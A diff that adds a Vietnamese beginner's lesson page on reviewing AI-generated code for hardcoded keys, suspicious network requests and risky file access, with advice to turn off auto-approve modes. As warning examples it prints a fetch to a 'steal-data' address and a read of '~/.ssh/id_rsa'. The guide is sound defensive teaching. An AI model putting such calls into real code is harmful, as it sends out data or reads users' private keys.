@@ -1,0 +1,139 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>5.3.6 Always Review</title>
+    <style>
+        body { font-family: system-ui, -apple-system, sans-serif; line-height: 1.6; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; }
+        pre { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        code { background: #f4f4f4; padding: 2px 5px; border-radius: 3px; font-family: monospace; }
+        a { color: #007bff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        table { border-collapse: collapse; width: 100%; margin: 20px 0; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        img { max-width: 100%; height: auto; }
+    </style>
+</head>
+<body>
+<hr />
+<p>title: "5.3.6 Luôn rà soát code"
+order: 8</p>
+<hr />
+<p><img alt="05-advanced_5.3-security_5.3.6-always-review.png" src="../../../public/images/Basic/05-advanced_5.3-security_5.3.6-always-review.png" /></p>
+<h1>5.3.6 Luôn rà soát code: Thói quen an toàn quan trọng nhất</h1>
+<p>Qua bài học này, bạn sẽ hiểu:</p>
+<ul>
+<li>Tại sao rà soát code lại quan trọng đến thế</li>
+<li>Cách rà soát code mà bạn không hoàn toàn hiểu</li>
+<li>Lời khuyên về "chế độ tự động phê duyệt" (auto-approve)</li>
+<li>Xây dựng thói quen rà soát bền vững</li>
+</ul>
+<h2>Số liệu đáng lo ngại</h2>
+<p>Theo khảo sát lập trình viên năm 2025:</p>
+<ul>
+<li>Chỉ <strong>67%</strong> lập trình viên rà soát code trước khi triển khai</li>
+<li>Hơn <strong>40%</strong> người mới thừa nhận đã triển khai code do AI tạo ra mà không hoàn toàn hiểu nó</li>
+<li><strong>33%</strong> lập trình viên cho biết sẽ sao chép dán trực tiếp code do AI tạo ra</li>
+</ul>
+<p>Điều này có nghĩa là: Rất nhiều người đang sử dụng đoạn code mà họ không thực sự hiểu.</p>
+<h2>Vibe Coding "thực thụ" là gì?</h2>
+<p>Simon Willison (Chuyên gia AI nổi tiếng, người đóng góp cốt lõi cho Django) có một quan điểm thú vị về điều này:</p>
+<blockquote>
+<p>"Nếu AI viết tất cả code, nhưng bạn rà soát, kiểm thử và hiểu nó, thì đó không phải là Vibe Coding — đó là dùng AI làm trợ lý đánh máy."</p>
+</blockquote>
+<p>Nói cách khác:</p>
+<table>
+<thead>
+<tr>
+<th>Cách làm</th>
+<th>Loại hình</th>
+<th>Rủi ro</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AI tạo → Rà soát → Kiểm thử → Triển khai</td>
+<td>Dùng AI hỗ trợ phát triển</td>
+<td>Khá thấp</td>
+</tr>
+<tr>
+<td>AI tạo → Triển khai ngay</td>
+<td>Vibe Coding thuần túy</td>
+<td>Khá cao</td>
+</tr>
+</tbody>
+</table>
+<p>Điều chúng tôi cổ vũ trong hướng dẫn này là <strong>phát triển có ý thức với sự hỗ trợ của AI</strong>: Tận dụng triệt để năng lực của AI, nhưng giữ lại sự phán đoán và rà soát của con người.</p>
+<h2>Cách rà soát code mà bạn không hoàn toàn hiểu</h2>
+<p>Bạn có thể nghĩ: Tôi là người mới, căn bản đọc không hiểu code, rà soát kiểu gì?</p>
+<p>Tin tốt là: Bạn không cần hiểu hoàn toàn từng dòng code, vẫn có thể thực hiện rà soát có ý nghĩa.</p>
+<h3>Mục kiểm tra 1: Thông tin nhạy cảm</h3>
+<p>Ngay cả khi không hiểu code, bạn cũng có thể nhận ra các mẫu này:</p>
+<pre><code class="language-javascript">// Tự hỏi: Ở đây có thứ gì trông giống khóa không?
+const key = &quot;sk-abc123...&quot;; // Cái này trông giống khóa
+const key = process.env.KEY; // Đây là cách đúng
+</code></pre>
+<h3>Mục kiểm tra 2: Yêu cầu mạng đáng ngờ</h3>
+<p>Lưu ý xem code có đang gửi dữ liệu đến địa chỉ lạ mà bạn không biết không:</p>
+<pre><code class="language-javascript">// Tự hỏi: Địa chỉ web này có phải là dịch vụ mình biết không?
+fetch(&quot;https://api.openai.com/...&quot;); // Bình thường, chính chủ OpenAI
+fetch(&quot;https://random-site.xyz/steal-data&quot;); // Đáng ngờ
+</code></pre>
+<h3>Mục kiểm tra 3: Thao tác file</h3>
+<p>Chú ý xem code có đang đọc ghi file không, đặc biệt là các đường dẫn nhạy cảm:</p>
+<pre><code class="language-javascript">// Tự hỏi: Tại sao lại đọc những file này?
+fs.readFile(&quot;~/.ssh/id_rsa&quot;); // Nguy hiểm! Đang đọc khóa riêng SSH
+fs.readFile(&quot;./data.json&quot;); // Bình thường, đọc dữ liệu trong dự án
+</code></pre>
+<h3>Mục kiểm tra 4: Nhờ AI giúp bạn rà soát</h3>
+<p>Bạn có thể nhờ một AI khác (hoặc chính AI đó) kiểm tra code:</p>
+<pre><code>Vui lòng rà soát đoạn code sau, kiểm tra xem có:
+1. Khóa hoặc mật khẩu bị hardcode
+2. Yêu cầu mạng đáng ngờ
+3. Thao tác file không an toàn
+4. Các mối nguy an toàn khác
+
+[Dán code vào đây]
+</code></pre>
+<p>::: tip Mẹo
+Dùng một AI để rà soát code của một AI khác, có thể phát hiện một số vấn đề rõ ràng. Nhưng điều này không thể thay thế phán đoán của chính bạn.
+:::</p>
+<h2>Tắt chế độ tự động phê duyệt</h2>
+<p>Một số AI IDE cung cấp "tự động phê duyệt" hoặc "chế độ Yolo", cho phép AI thực thi lệnh hoặc sửa file mà không cần bạn xác nhận.</p>
+<p><strong>Người mới bắt đầu nên tắt tính năng này.</strong></p>
+<p>Lý do:</p>
+<ol>
+<li>Bạn cần nhìn thấy AI đang làm gì để học hỏi</li>
+<li>AI có thể thực hiện những thay đổi bạn không mong muốn</li>
+<li>Nếu xảy ra lỗi, bạn không thể ngăn chặn kịp thời</li>
+</ol>
+<p>Xác nhận thủ công từng thao tác tuy chậm một chút, nhưng an toàn hơn, cũng giúp bạn hiểu chuyện gì đang xảy ra.</p>
+<h2>Xây dựng thói quen rà soát bền vững</h2>
+<p>Rà soát code không tốn nhiều thời gian. Hãy xây dựng các thói quen sau:</p>
+<p><strong>Mỗi khi AI tạo code xong</strong>:</p>
+<ul>
+<li>[ ] Lướt nhanh qua, xem có chuỗi ký tự trông giống khóa không</li>
+<li>[ ] Nếu có yêu cầu mạng, xác nhận địa chỉ đích là cái bạn biết</li>
+<li>[ ] Nếu không hiểu đoạn code nào đó đang làm gì, hỏi AI giải thích</li>
+</ul>
+<p><strong>Mỗi khi chuẩn bị commit/triển khai</strong>:</p>
+<ul>
+<li>[ ] Chạy danh sách kiểm tra an toàn (bài 5.3.4)</li>
+<li>[ ] Xác nhận file .env không bị bao gồm vào</li>
+</ul>
+<p><strong>Ôn tập định kỳ</strong>:</p>
+<ul>
+<li>[ ] Kiểm tra các phụ thuộc dự án có cần cập nhật không</li>
+<li>[ ] Xác nhận không có cảnh báo an toàn mới</li>
+</ul>
+<h2>Ghi nhớ nguyên tắc này</h2>
+<p>::: warning Nguyên tắc cốt lõi
+<strong>Code do AI tạo ra, trách nhiệm cuối cùng thuộc về bạn.</strong></p>
+<p>Điều này không phải để dọa bạn, mà là nhắc nhở bạn: Duy trì thói quen rà soát là cách tốt nhất để bảo vệ chính mình.
+:::</p>
+<p>→ <a href="./5.3.7-summary_vi.html">5.3.7 Tóm tắt các điểm chính</a></p>
+</body>
+</html>
